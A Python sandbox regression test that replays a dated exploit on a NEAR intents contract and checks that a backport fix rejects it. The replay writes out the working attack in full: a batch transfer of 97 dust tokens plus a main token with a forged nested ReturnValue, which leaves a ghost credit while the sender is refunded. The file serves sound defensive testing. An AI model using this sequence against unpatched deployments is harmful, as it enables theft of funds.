"""End-to-end replay of the 2026-10-01 exploit in a real local sandbox (no mocks).

Slow (about a minute) and needs the pinned near-sandbox binary plus the built wasms (see README), so it runs only
with INTENTS_SANDBOX_E2E=1.
"""

import json
import os
import tempfile
import unittest
from pathlib import Path

from near.intents.synthetic import scenarios
from near.intents.synthetic.fastnear_shape import to_fastnear
from near.intents.synthetic.sandbox import Account, Chain, Node, Rpc, default_binary
from near.intents.synthetic.world import build_world

DUST = "4444119_" + "E" * 93  # same length as the exploit's dust token id
MAIN = "usdt_main"


def replay(version: str, home: Path) -> tuple[int, int, dict]:
    """Returns (credit intents kept for the receiver, tokens refunded to the sender, FastNEAR-shaped tx)."""
    node = Node(default_binary(), home).start()
    try:
        chain = Chain(Rpc(node.rpc_url))
        root_id, root_key = node.root_key()
        world = build_world(chain, Account(chain, root_id, root_key), version)
        attacker = world.new_implicit("e2e-attacker")
        receiver = world.new_receiver("e2e-receiver")
        world.mint_on_omni(attacker.account_id, [DUST, MAIN], [10**38 + 10**6, 10**24])
        attacker.call(world.omni.account_id, "mt_transfer_call", {
            "receiver_id": world.intents_id, "token_id": DUST, "amount": str(10**38),
            "msg": receiver.account_id}, deposit=1)
        before_sender = scenarios.omni_balance(world, attacker.account_id, [MAIN])[0]
        status = attacker.call(world.omni.account_id, "mt_batch_transfer_call", {
            "receiver_id": world.intents_id, "token_ids": [DUST] * 97 + [MAIN],
            "amounts": ["1"] * 97 + [str(10**21)],
            "msg": json.dumps({"receiver_id": receiver.account_id,
                               "msg": json.dumps({"ReturnValue": str(10**36)})})}, deposit=1)
        credit = scenarios.intents_balance(world, receiver.account_id, [scenarios.OMNI_PREFIX + MAIN])[0]
        refunded = scenarios.omni_balance(world, attacker.account_id, [MAIN])[0] - before_sender + 10**21
        blocks = {h: {"height": chain.block(h)["height"], "timestamp": int(chain.block(h)["timestamp"])}
                  for h in {status["transaction_outcome"]["block_hash"]}
                  | {ro["block_hash"] for ro in status["receipts_outcome"]}}
        return credit, refunded, to_fastnear(status, blocks)
    finally:
        node.stop()


@unittest.skipUnless(os.environ.get("INTENTS_SANDBOX_E2E") == "1", "set INTENTS_SANDBOX_E2E=1 to run the sandbox")
class ExploitReplayTest(unittest.TestCase):
    def test_vulnerable_version_keeps_the_credit_after_refunding_the_sender(self):
        with tempfile.TemporaryDirectory() as home:
            credit, refunded, tx = replay("v0.4.2", Path(home))
        self.assertEqual(credit, 10**21)  # ghost credit inside intents.near
        self.assertEqual(refunded, 10**21)  # while the token gave the deposit back
        failed = [a["FunctionCall"]["method_name"] for r in tx["receipts"]
                  if "Failure" in r["execution_outcome"]["outcome"]["status"]
                  for a in r["receipt"]["receipt"]["Action"]["actions"]]
        self.assertEqual(failed, ["mt_resolve_deposit"])

    def test_batch_limit_fix_rejects_the_deposit(self):
        with tempfile.TemporaryDirectory() as home:
            credit, refunded, tx = replay("v0.4.3-backport", Path(home))
        self.assertEqual(credit, 0)
        self.assertEqual(refunded, 10**21)
        statuses = json.dumps([r["execution_outcome"]["outcome"]["status"] for r in tx["receipts"]])
        self.assertIn("too many tokens", statuses)


if __name__ == "__main__":
    unittest.main()
